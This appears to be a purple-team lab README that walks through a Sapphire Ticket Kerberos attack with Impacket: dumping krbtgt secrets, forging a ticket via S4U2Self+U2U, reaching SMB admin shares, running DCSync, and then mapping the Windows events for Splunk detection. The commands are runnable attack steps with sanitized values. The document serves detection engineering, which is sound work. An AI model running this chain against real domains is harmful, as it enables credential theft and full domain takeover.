# Sapphire Ticket Simulation

## Overview

This scenario demonstrates a Sapphire Ticket attack in an isolated Active Directory laboratory.

The simulation follows the attack chain from obtaining a legitimate Kerberos TGT, impersonating a privileged identity through S4U2Self + U2U, creating the Sapphire Ticket, requesting a service ticket, accessing a Kerberos service, and finally validating privileged access through DCSync activity.

> All credentials, hashes, AES keys, SIDs, hostnames, and IP addresses shown below are sanitized laboratory values.

---

# 1. Lab Environment

| Component         | Value                               |
| ----------------- | ----------------------------------- |
| Domain            | `lab.example.local`                 |
| Domain Controller | `dc01.lab.example.local`            |
| DC IP             | `192.0.2.10`                        |
| Attacker          | Kali Linux                          |
| Attacker IP       | `192.0.2.50`                        |
| Base Domain User  | `labuser`                           |
| Impersonated User | `Administrator`                     |
| Forged Identity   | `testuser`                          |
| Target Service    | `cifs/fileserver.lab.example.local` |
| Tooling           | Impacket                            |
| SIEM              | Splunk                              |

---

# 2. Prerequisites

The simulation requires:

* An isolated Active Directory laboratory
* A compromised or controlled domain environment
* Valid domain credentials
* Kerberos authentication
* Impacket
* Network connectivity to the Domain Controller
* Windows Security Auditing
* SIEM/log collection

---

# 3. Obtain Domain and Kerberos Secrets

In this scenario, the required Kerberos material is obtained from the controlled laboratory environment.

Sanitized example:

```bash
impacket-secretsdump \
    lab.example.local/administrator:'<LAB_PASSWORD>'@192.0.2.10
```

Expected sanitized output:

```text
[*] Target system bootKey: <REDACTED_BOOTKEY>

[*] Dumping local SAM hashes

Administrator:500:<LM_HASH>:<NT_HASH>:::
Guest:501:<LM_HASH>:<NT_HASH>:::

[*] Dumping Domain Credentials

Administrator:500:<LM_HASH>:<NT_HASH>:::
krbtgt:502:<LM_HASH>:<KRBTGT_NT_HASH>:::
lab.example.local\labuser:1105:<LM_HASH>:<USER_NT_HASH>:::
DC01$:1001:<LM_HASH>:<MACHINE_NT_HASH>:::

[*] Kerberos keys grabbed

krbtgt:aes256-cts-hmac-sha1-96:<KRBTGT_AES256_KEY>
krbtgt:aes128-cts-hmac-sha1-96:<KRBTGT_AES128_KEY>

labuser:aes256-cts-hmac-sha1-96:<USER_AES256_KEY>
labuser:aes128-cts-hmac-sha1-96:<USER_AES128_KEY>
```

> Never commit real passwords, NT hashes, AES keys, machine account secrets, or other credential material to a public repository.

---

# 4. Create the Sapphire Ticket

The Sapphire Ticket is created using a legitimate TGT as the basis and requesting the PAC of the target identity through **S4U2Self + U2U**.

Sanitized example:

```bash
ticketer.py \
    -request \
    -impersonate 'Administrator' \
    -domain 'lab.example.local' \
    -user 'labuser' \
    -password '<LAB_PASSWORD>' \
    -nthash '<KRBTGT_NT_HASH>' \
    -aesKey '<KRBTGT_AES256_KEY>' \
    -domain-sid 'S-1-5-21-1111111111-2222222222-3333333333' \
    'testuser'
```

Expected output:

```text
Impacket v0.13.x

[-] doing sapphire ticket, ignoring following parameters:
    -groups, -duration

[*] Requesting TGT to target domain to use as basis
[*] Customizing ticket for lab.example.local/testuser
[*]     Requesting S4U2self+U2U to obtain Administrator's PAC
[*]     Decrypting ticket & extracting PAC
[*]     Clearing signatures
[*]     Adding necessary ticket flags
[*]     Changing keytype
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving/Updating ticket in testuser.ccache
```

The important difference from a traditional forged Golden Ticket is that the PAC is obtained from the KDC through the S4U2Self + U2U flow rather than simply constructing the complete privileged PAC manually.

---

# 5. Load the Kerberos Cache

```bash
export KRB5CCNAME=$(pwd)/testuser.ccache
```

Verify the cache:

```bash
klist
```

Expected:

```text
Ticket cache: FILE:testuser.ccache
Default principal: testuser@LAB.EXAMPLE.LOCAL

Valid starting       Expires              Service principal
10/07/2026 10:00:00  10/07/2026 20:00:00  krbtgt/LAB.EXAMPLE.LOCAL@LAB.EXAMPLE.LOCAL
```

---

# 6. Request a Service Ticket

Request a CIFS service ticket using the Sapphire Ticket:

```bash
impacket-getST \
    -k \
    -no-pass \
    -spn cifs/fileserver.lab.example.local \
    lab.example.local/testuser
```

Expected:

```text
[*] Getting credentials for:
    cifs/fileserver.lab.example.local

[*] Saving ticket in:
    testuser.ccache
```

Then verify:

```bash
klist
```

Expected:

```text
Ticket cache: FILE:testuser.ccache
Default principal: testuser@LAB.EXAMPLE.LOCAL

Valid starting       Expires              Service principal
10/07/2026 10:00:00  10/07/2026 20:00:00  krbtgt/LAB.EXAMPLE.LOCAL@LAB.EXAMPLE.LOCAL
10/07/2026 10:05:00  10/07/2026 20:00:00  cifs/fileserver.lab.example.local@LAB.EXAMPLE.LOCAL
```

---

# 7. Access the Target SMB Service

Use the obtained Kerberos ticket to authenticate to the target SMB service:

```bash
impacket-smbclient \
    -k \
    -no-pass \
    fileserver.lab.example.local
```

Expected:

```text
Type help for list of commands

# shares
Share Name       Type
----------------------
ADMIN$           DISK
C$               DISK
IPC$             IPC
NETLOGON         DISK
```

This validates that the Kerberos ticket can be used to authenticate to the target service.

---

# 8. Validate Privileged Access with DCSync

In the controlled laboratory, the next stage is to validate whether the impersonated privileged identity can perform directory replication operations.

Sanitized example:

```bash
impacket-secretsdump \
    -k \
    -no-pass \
    lab.example.local/testuser@dc01.lab.example.local
```

Alternatively, the replication operation can be explicitly scoped to the target account:

```bash
impacket-secretsdump \
    -k \
    -no-pass \
    -just-dc-user krbtgt \
    lab.example.local/testuser@dc01.lab.example.local
```

Expected sanitized output:

```text
[*] Using Kerberos authentication
[*] Dumping Domain Credentials
[*] Using DRSUAPI method

krbtgt:502:<LM_HASH>:<KRBTGT_NT_HASH>:::

[*] Kerberos keys grabbed

krbtgt:aes256-cts-hmac-sha1-96:<KRBTGT_AES256_KEY>
krbtgt:aes128-cts-hmac-sha1-96:<KRBTGT_AES128_KEY>
```

> In a real environment, successful DCSync indicates that the authenticated security principal has sufficient directory replication privileges. Perform this step only against an authorized laboratory domain.

---

# 9. Attack Flow

```text
Valid Domain Credentials
          |
          v
       Obtain TGT
          |
          v
   Sapphire Ticket
          |
          v
 S4U2Self + U2U Request
          |
          v
 Obtain Target User PAC
          |
          v
  Customize / Sign Ticket
          |
          v
    testuser.ccache
          |
          v
      Request TGS
          |
          v
   CIFS Authentication
          |
          v
     SMB Access
          |
          v
      DCSync
          |
          v
Directory Replication
          |
          v
Credential / Kerberos
      Material
          |
          v
   Detection in SIEM
```

---

# 10. Expected Windows Telemetry

Potentially relevant Windows Security events include:

| Event ID | Description                                                                            |
| -------- | -------------------------------------------------------------------------------------- |
| 4768     | Kerberos Authentication Service ticket request                                         |
| 4769     | Kerberos Service Ticket request                                                        |
| 4624     | Successful logon                                                                       |
| 4672     | Special privileges assigned to a new logon                                             |
| 4662     | An operation was performed on an object                                                |
| 5145     | A network share object was checked to see whether client can be granted desired access |

For the DCSync stage, **Event ID 4662** is particularly important when directory-service auditing is configured to capture replication-related operations.

---

# 11. Detection Validation

The objective is to correlate the Kerberos activity generated during the attack with the subsequent privileged access.

```text
Sapphire Ticket
      |
      v
Kerberos Authentication
      |
      +------> 4768
      |
      +------> 4769
      |
      v
SMB Authentication
      |
      v
Privileged Directory Access
      |
      v
4662 Replication Activity
      |
      v
Windows Event Forwarding
      |
      v
Splunk
      |
      v
Detection Rule
```

Validate that:

1. Kerberos authentication events are generated.
2. The source host is correctly identified.
3. The requested service is visible.
4. The privileged account activity is visible.
5. Directory replication activity is logged.
6. The events are successfully ingested into Splunk.
7. The detection identifies the attack without generating excessive false positives.

See:

[`detection.spl`](./detection.spl)

---

# 12. Indicators to Record

| Indicator         | Description                                    |
| ----------------- | ---------------------------------------------- |
| Source IP         | Host generating the authentication             |
| TGT Account       | Account used to obtain the initial TGT         |
| Impersonated User | Identity whose PAC is obtained                 |
| TGS Account       | Account associated with the service request    |
| Service Name      | Requested Kerberos service                     |
| Event ID          | Windows Security Event                         |
| Timestamp         | Time of authentication                         |
| Ticket Lifetime   | TGT/TGS validity period                        |
| Encryption Type   | Kerberos encryption type                       |
| Object DN         | Directory object involved in privileged access |
| Access Mask       | Directory-service access requested             |

---

# 13. Cleanup

Remove the temporary Kerberos cache:

```bash
rm -f testuser.ccache
```

If temporary accounts, permissions, ACLs, or configuration changes were created specifically for the simulation, revert them to the original laboratory state.

---

## Disclaimer

This simulation is intended for authorized security research, purple-team exercises, detection engineering, and educational purposes in isolated laboratory environments only.

```

یک نکته مهم برای ساختار Repository: در بخش DCSync عمداً `-just-dc-user krbtgt` را به‌عنوان **validation step** گذاشتم؛ برای یک GitHub عمومی بهتر است همین حالت محدود را نگه داری و سراغ dump کامل Domain نروی. همچنین `4662` را به‌عنوان telemetry مهم DCSync آوردم تا بعداً `detection.spl` را بتوانیم دقیقاً روی **Sapphire → SMB → DCSync** طراحی کنیم.
```
